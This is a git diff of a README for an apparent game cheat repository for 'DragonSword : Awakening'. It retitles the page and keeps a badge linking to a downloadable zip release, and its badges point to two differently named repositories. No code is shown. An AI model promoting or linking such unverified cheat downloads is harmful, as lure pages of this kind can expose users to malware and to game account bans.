@@ -1,4 +1,4 @@
-# DragonSword : Awakening Cheats / Hack (21-Aug-26)
+# DragonSword : Awakening Hack (Cheats Menu) (23-Aug-26)
 
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Cheat/releases/download/v1.2/DSAW-V1.zip)
@@ -7,7 +7,6 @@
 [![Stars](https://img.shields.io/github/stars/Crushflalead/DragonSword-Awakening-Trainer?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Cheat/stargazers)
 
 
-_A feature-rich in-game cheat menu for DragonSword : Awakening with a clean overlay UI_
 
 Check the Features list below.
 
